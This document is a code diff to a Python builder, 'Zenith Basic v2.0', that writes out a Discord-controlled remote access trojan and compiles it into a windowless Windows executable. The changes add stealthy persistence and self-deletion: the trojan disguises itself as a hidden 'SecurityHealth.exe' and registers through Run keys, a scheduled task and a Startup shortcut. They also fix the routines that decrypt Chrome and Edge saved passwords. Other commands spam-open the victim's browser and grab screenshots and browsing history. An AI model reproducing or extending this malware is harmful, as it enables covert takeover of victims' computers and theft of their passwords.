@@ -1,11 +1,30 @@
 import os
+import sys
 import time
+
+import subprocess
+import sys as _sys
+
+
+def _ensure_builder_deps():
+    try:
+        import colorama
+        import fade
+        return
+    except ImportError:
+        pass
+    print("Installing builder dependencies (colorama, fade, pyinstaller)...")
+    pkgs = "colorama fade discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests pyinstaller appdirs"
+    try:
+        subprocess.check_call([_sys.executable, "-m", "pip", "install", *pkgs.split(), "--quiet"])
+    except Exception as e:
+        print(f"Warning: failed to auto-install builder deps: {e}")
+
+_ensure_builder_deps()
+
 from colorama import init, Fore, Style
 
-os.system("pip install -r requirements.txt")
-os.system("cls")
-
-from fade import fire, water, purpleblue
+import fade
 
 def print_banner():
     banner = """
@@ -18,11 +37,22 @@ def print_banner():
                                                                       Zenith Basic v2.0"""
     
     print()
-    faded_banner = water(banner)
+    faded_banner = fade.water(banner)
     print(faded_banner)
 
 def main():
     init()
+    print_banner()
+    
+    python_exe = f'"{sys.executable}"'
+    
+    print(f"{Fore.CYAN}Checking / installing required packages (this may take a minute the first time)...")
+    rat_packages = "discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests appdirs"
+    pip_result = os.system(f"{python_exe} -m pip install {rat_packages} --upgrade --force-reinstall --no-warn-script-location -q")
+    if pip_result != 0:
+        print(f"{Fore.YELLOW}Warning: pip install returned code {pip_result}. Continuing anyway...")
+    
+    os.system("cls")
     print_banner()
     
     token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
@@ -32,13 +62,128 @@ def main():
     
     code = f"""TOKEN = '{token}'\n\n"""
 
-    code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time
+    code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time, json, base64, shutil, win32crypt, webbrowser
 from discord.ext import commands
 from ctypes import windll
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 import GPUtil
 import cv2
+from Crypto.Cipher import AES
+
+
+def delete_self(original_path):
+    try:
+        kernel32 = ctypes.windll.kernel32
+        MoveFileExW = kernel32.MoveFileExW
+        MoveFileExW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint32]
+        MoveFileExW.restype = ctypes.c_bool
+        MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004
+        if MoveFileExW(original_path, None, MOVEFILE_DELAY_UNTIL_REBOOT):
+            return
+    except:
+        pass
+
+    try:
+        os.remove(original_path)
+        return
+    except:
+        pass
+
+    try:
+        bat = os.path.join(tempfile.gettempdir(), "del_" + str(random.randint(1000,9999)) + ".bat")
+        with open(bat, "w") as f:
+            f.write('@echo off\n')
+            f.write('timeout /t 8 /nobreak >nul 2>&1\n')
+            f.write('del /f /q "' + original_path + '" >nul 2>&1\n')
+            f.write('del /f /q "%~f0" >nul 2>&1\n')
+        subprocess.Popen(['cmd', '/c', bat], shell=True, creationflags=0x08000000)
+    except:
+        pass
+
+
+def install_persistence():
+
+    try:
+        if getattr(sys, 'frozen', False):
+            current_path = sys.executable
+        else:
+            current_path = os.path.abspath(__file__)
+
+
+        appdata = os.getenv("APPDATA")
+        persist_dir = os.path.join(appdata, "Microsoft", "Windows", "SecurityHealth")
+        os.makedirs(persist_dir, exist_ok=True)
+        subprocess.run(f'attrib +h "{os.path.dirname(persist_dir)}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        persist_path = os.path.join(persist_dir, "SecurityHealth.exe")
+
+        is_original = os.path.abspath(current_path).lower() != os.path.abspath(persist_path).lower()
+
+        if is_original:
+
+            try:
+                shutil.copy2(current_path, persist_path)
+                subprocess.run(f'attrib +h +s "{persist_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            except:
+                pass
+
+            # Registry Run (main)
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
+                    winreg.SetValueEx(key, "SecurityHealth", 0, winreg.REG_SZ, f'"{persist_path}"')
+            except:
+                pass
+
+            # Registry RunOnce (strong backup for restart/shutdown)
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, winreg.KEY_SET_VALUE) as key:
+                    winreg.SetValueEx(key, "SecurityHealth", 0, winreg.REG_SZ, f'"{persist_path}"')
+            except:
+                pass
+
+            # Scheduled task without LIMITED (much more reliable after reboot)
+            try:
+                task_name = "SecurityHealth"
+                cmd = f'schtasks /create /tn "{task_name}" /tr "{persist_path}" /sc onlogon /f >nul 2>&1'
+                subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            except:
+                pass
+
+            # Startup folder .lnk
+            try:
+                startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+                os.makedirs(startup_folder, exist_ok=True)
+                shortcut_path = os.path.join(startup_folder, "SecurityHealth.lnk")
+
+                vbs_script = f'''
+Set ws = CreateObject("WScript.Shell")
+Set shortcut = ws.CreateShortcut("{shortcut_path}")
+shortcut.TargetPath = "{persist_path}"
+shortcut.WorkingDirectory = "{os.path.dirname(persist_path)}"
+shortcut.WindowStyle = 7
+shortcut.IconLocation = "shell32.dll,13"
+shortcut.Save
+'''
+                vbs_path = os.path.join(tempfile._get_default_tempdir(), "persist_shortcut.vbs")
+                with open(vbs_path, "w") as f:
+                    f.write(vbs_script)
+                subprocess.run(f'wscript "{vbs_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                try:
+                    os.remove(vbs_path)
+                except:
+                    pass
+            except:
+                pass
+
+            try:
+                delete_self(current_path)
+            except:
+                pass
+
+    except:
+        pass
+
+
 
 class BITMAPINFOHEADER(ctypes.Structure):
     _fields_ = [
@@ -160,6 +305,8 @@ bot.allowed_channel_ids = {}
 
 @bot.check
 async def check_channel(ctx):
+    if ctx.guild is None:
+        return False
     guild_id = str(ctx.guild.id)
     if guild_id not in bot.allowed_channel_ids:
         return False
@@ -167,11 +314,20 @@ async def check_channel(ctx):
 
 @bot.event
 async def on_connect():
-    guild = bot.guilds[0] 
-    category = await guild.create_category("Sessions")
-    channel = await guild.create_text_channel(f'session-{platform.node()}', category=category)
-    bot.allowed_channel_ids[str(guild.id)] = channel.id
-    await channel.send(f"New session started for {platform.node()}. Commands will only work in this channel.")
+    if not bot.guilds:
+        print("Warning: Bot is not a member of any guilds yet.")
+        return
+    try:
+        guild = bot.guilds[0]
+
+        category = discord.utils.get(guild.categories, name="Sessions")
+        if category is None:
+            category = await guild.create_category("Sessions")
+        channel = await guild.create_text_channel(f'session-{platform.node()}', category=category)
+        bot.allowed_channel_ids[str(guild.id)] = channel.id
+        await channel.send(f"New session started for {platform.node()}. Commands will only work in this channel.")
+    except Exception as e:
+        print(f"Failed to create session channel: {e}")
 
 @bot.event
 async def on_session_connect(guild_id, session_id):
@@ -271,6 +427,7 @@ async def screenshot(ctx):
     $bitmap.Dispose()
     '''
     
+    script_path = None
     try:
         script_path = os.path.join(tempfile._get_default_tempdir(), "screenshot.ps1")
         with open(script_path, "w") as f:
@@ -293,7 +450,7 @@ async def screenshot(ctx):
     except Exception as e:
         await ctx.send(f"Error taking screenshot: {str(e)}")
     finally:
-        if os.path.exists(script_path):
+        if script_path and os.path.exists(script_path):
             os.remove(script_path)
 
 async def send_subprocess(ctx, command):
@@ -615,97 +772,26 @@ async def history(ctx):
     except Exception as e:
         await ctx.send(f"Error retrieving browser history: {str(e)}")
 
-@bot.command(brief="Spams requests to a website.", description="Sends multiple requests to a website. Usage: $spam_site <url> <threads> <requests_per_thread> [auth_type] [auth_value]")
-async def spam_site(ctx, url: str, threads: int = 10, requests_per_thread: int = 100, auth_type: str = None, auth_value: str = None):
+@bot.command(brief="Spams opening a website in the victim's browser.")
+async def spam_site(ctx, url: str, amount: int = 100):
     try:
-        parsed = urlparse(url)
-        if not parsed.scheme or not parsed.netloc:
-            await ctx.send("Invalid URL. Make sure to include http:// or https://")
-            return
-            
-        if threads > 100:
-            await ctx.send("Maximum thread count is 100")
-            return
-            
-        if requests_per_thread > 1000:
-            await ctx.send("Maximum requests per thread is 1000")
-            return
+        if not url.startswith(("http://", "https://")):
+            url = "https://" + url
 
-        successful_requests = 0
-        failed_requests = 0
-        lock = threading.Lock()
+        await ctx.send(f"Spamming {url} ({amount} browser opens)...")
 
-        def make_requests(url, count):
-            nonlocal successful_requests, failed_requests
-            
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Upgrade-Insecure-Requests': '1',
-                'Sec-Fetch-Dest': 'document',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1',
-                'DNT': '1',
-                'Cache-Control': 'max-age=0',
-                'Referer': url
-            }
-
-            auth = None
-            if auth_type and auth_value:
-                if auth_type.lower() == 'basic':
-                    auth = requests.auth.HTTPBasicAuth(*auth_value.split(':'))
-                elif auth_type.lower() == 'bearer':
-                    headers['Authorization'] = f'Bearer {auth_value}'
-                elif auth_type.lower() == 'apikey':
-                    headers['X-API-Key'] = auth_value
-
-            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            
-            session = requests.Session()
-            
-            for _ in range(count):
+        def do_spam():
+            for _ in range(amount):
                 try:
-                    if random.choice([True, False]):
-                        response = session.get(url, headers=headers, auth=auth, timeout=5, verify=False)
-                    else:
-                        response = session.post(url, headers=headers, auth=auth, timeout=5, verify=False)
-                        
-                    with lock:
-                        successful_requests += 1
+                    webbrowser.open(url, new=0)
+                    time.sleep(0.01)
                 except:
-                    with lock:
-                        failed_requests += 1
-                
-                time.sleep(random.uniform(0.1, 0.3))
+                    pass
 
-        await ctx.send(f"Starting spam attack with {threads} threads, {requests_per_thread} requests per thread...")
-
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = []
-            for _ in range(threads):
-                futures.append(executor.submit(make_requests, url, requests_per_thread))
-
-        embed = discord.Embed(
-            title="Spam Attack Results",
-            color=discord.Color.green()
-        )
-        embed.add_field(name="Target URL", value=url, inline=False)
-        embed.add_field(name="Total Threads", value=str(threads), inline=True)
-        embed.add_field(name="Requests per Thread", value=str(requests_per_thread), inline=True)
-        embed.add_field(name="Successful Requests", value=str(successful_requests), inline=True)
-        embed.add_field(name="Failed Requests", value=str(failed_requests), inline=True)
-        embed.add_field(name="Total Requests", value=str(successful_requests + failed_requests), inline=True)
-        if auth_type:
-            embed.add_field(name="Authentication", value=auth_type, inline=True)
-        
-        await ctx.send(embed=embed)
+        threading.Thread(target=do_spam, daemon=True).start()
 
     except Exception as e:
-        await ctx.send(f"Error during spam attack: {str(e)}")
+        await ctx.send(f"Error spamming site: {str(e)}")
 
 def get_master_key():
     try:
@@ -717,22 +803,19 @@ def get_master_key():
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
-
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
-
 def decrypt_password_edge(buff, master_key):
     try:
         iv = buff[3:15]
-        payload = buff[15:]
-        cipher = generate_cipher(master_key, iv)
-        decrypted_pass = decrypt_payload(cipher, payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
-        return decrypted_pass
-    except Exception as e: 
-        return "Chrome < 80"
+        ciphertext = buff[15:-16]
+        tag = buff[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
+        return decrypted_pass.decode()
+    except Exception:
+        try:
+            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
+        except:
+            return ""
 
 def get_passwords_edge():
     master_key = get_master_key()
@@ -768,9 +851,6 @@ def get_passwords_edge():
         pass
     return result
 
-def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
 def get_encryption_key():
     try:
         local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
@@ -786,9 +866,11 @@ def get_encryption_key():
 def decrypt_password_chrome(password, key):
     try:
         iv = password[3:15]
-        password = password[15:]
+        ciphertext = password[15:-16]
+        tag = password[-16:]
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(password)[:-16].decode()
+        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+        return decrypted.decode()
     except:
         try: 
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
@@ -800,7 +882,7 @@ def get_chrome_passwords():
     if not key:
         return {}
         
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
     file_name = "ChromeData.db"
     try:
         shutil.copyfile(db_path, file_name)
@@ -831,8 +913,6 @@ def get_chrome_passwords():
     return result
 
 def grab_passwords():
-    global file_name, nanoseconds
-    file_name, nanoseconds = 116444736000000000, 10000000
     result = {}
     
 
@@ -872,17 +952,36 @@ async def grabpassword(ctx):
     except Exception as e:
         await ctx.send(f"Error grabbing passwords: {str(e)}")
 
+install_persistence()
+
 bot.run(TOKEN)
 """
 
     with open("code.py", "w") as file:
         file.write(code)
 
-    os.system("pyinstaller --onefile --noconsole --icon=NONE code.py")
+    print(f"{Fore.CYAN}Running PyInstaller using: {sys.executable}")
+    build_cmd = (
+        f'{python_exe} -m PyInstaller --onefile --noconsole --icon=NONE '
+        '--hidden-import=win32crypt --hidden-import=Crypto.Cipher.AES '
+        '--hidden-import=cv2 --hidden-import=GPUtil --hidden-import=psutil '
+        '--hidden-import=discord --hidden-import=discord.commands '
+        '--hidden-import=discord.commands.context --hidden-import=discord.ext.commands '
+        '--hidden-import=discord.app_commands --hidden-import=discord.ui '
+        '--hidden-import=discord.enums --hidden-import=discord.interactions '
+        '--hidden-import=appdirs --hidden-import=pkg_resources '
+        '--collect-all setuptools --collect-submodules discord --collect-submodules aiohttp code.py'
+    )
+    result = os.system(build_cmd)
 
-    print(f"\n{Fore.YELLOW}building process finished")
-    print(f"{Fore.GREEN}The executable can be found in the 'dist' folder")
-    print(f"{Fore.GREEN}You can edit the code in 'code.py'")
+    exe_path = os.path.join("dist", "code.exe")
+    if os.path.exists(exe_path):
+        print(f"\n{Fore.GREEN}[OK] Build successful!")
+        print(f"{Fore.GREEN}The executable is here: {os.path.abspath(exe_path)}")
+    else:
+        print(f"\n{Fore.RED}[FAIL] Build failed or executable not found.")
+        print(f"{Fore.YELLOW}PyInstaller exit code: {result}")
+        print(f"{Fore.YELLOW}Check the output above for errors.")
 
 
 if __name__ == "__main__":
